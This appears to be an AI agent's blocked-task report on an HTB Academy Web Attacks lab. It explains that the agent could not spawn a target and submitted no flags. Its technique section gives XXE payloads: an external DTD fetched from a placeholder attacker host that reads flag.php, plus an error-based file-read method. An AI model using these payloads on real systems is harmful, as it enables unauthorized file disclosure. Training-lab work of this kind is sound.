# Module 134 — Web Attacks
## BLOCKED: Lab target unobtainable (account-wide target contention)

**Module state at time of work:** 77.78% complete (15/18 sections reached; already-completed
sections were done in a prior session — Introduction, HTTP Verb Tampering, IDOR, and 2/5
XXE Injection sections). Remaining work: finish XXE Injection (3 sections, currently on
"Advanced File Disclosure", section 15/18) + Skills Assessment (1 section).

## What was attempted
- Opened section 15/18 "Advanced File Disclosure" (question: read `/flag.php` via the CDATA
  OOB-XXE method at `/index.php`, or the error-based XXE method at `/error`).
- Read the section theory in full (CDATA-wrapped external-entity exfiltration via a hosted
  external DTD referencing parameter entities, to bypass the "internal/external entity can't
  be joined" XML restriction; and the error-based technique for forcing file content into an
  XML parser error message when no direct output field exists).
- Repeatedly tried to spawn the section's lab target via the "Spawn the target system"
  button / `POST /api/v2/modules/134/sections/1206/lab/spawn` API call.

## Why it's blocked
HTB Academy allows only **one spawned lab target across the entire account**, and this
session observed at least 6-8 other browser tabs/agents concurrently working other modules
on the same account (Footprinting/112, XSS/103, File Transfers/24, Attacking Common
Services/116, Shells & Payloads/115, Linux Privesc/51, Command Injections/109, Ffuf/54,
AD Enumeration/143) — all racing for the same single target slot. Every spawn attempt on
module 134 returned **HTTP 503** from the spawn endpoint, and the one time the target
briefly showed as available, another agent's spawn request won the race before mine
completed (target came up as `ACADEMY-FOOT-NIX01`, i.e. claimed by the Footprinting module,
not Web Attacks).

## Approach to use once a target is obtainable (technique reference for next attempt)
1. **CDATA method (`/index.php`):** Host a `.dtd` file on an attacker-controlled HTTP server
   containing an out-of-band parameter-entity chain:
   `<!ENTITY % begin "<![CDATA["> <!ENTITY % file SYSTEM "file:///var/www/html/flag.php">
   <!ENTITY % end "]]>"> <!ENTITY % joined "%begin;%file;%end;">` then `%joined;` — reference
   it from the target's payload via `<!ENTITY % xxe SYSTEM "http://ATTACKER_IP:PORT/x.dtd">%xxe;`
   and print `&joined;` in the XML body so the flag's contents are returned wrapped in a CDATA
   block (bypasses "XML doesn't allow joining internal/external entities" restriction, and
   prevents non-XML-safe bytes in the source from breaking the parser).
2. **Error-based method (`/error`):** When there is no reflection point at all, force the
   parser to leak file contents through a parse error, e.g. reference a nonexistent entity
   inside a file path built from `SYSTEM "file:///nonexistent/%file;"`, so the resulting
   parser error message embeds the file's content (classic `libxml`/PHP xxe error-oracle
   technique — load the external entity into a filename that doesn't exist, forcing a verbose
   "failed to open stream" error containing the read data).
3. Submit the recovered flag string in Question 1, click **Mark Complete & Next**, and repeat
   for the remaining 2 XXE sections and the Skills Assessment section (which typically chains
   the last few sections' techniques against one or two target flags).

## Next steps
Re-run this module later when the account's shared target is less contended. No answers
were submitted for this module in this session because no live target was ever obtained —
consistent with the task's instruction not to fabricate flag values.
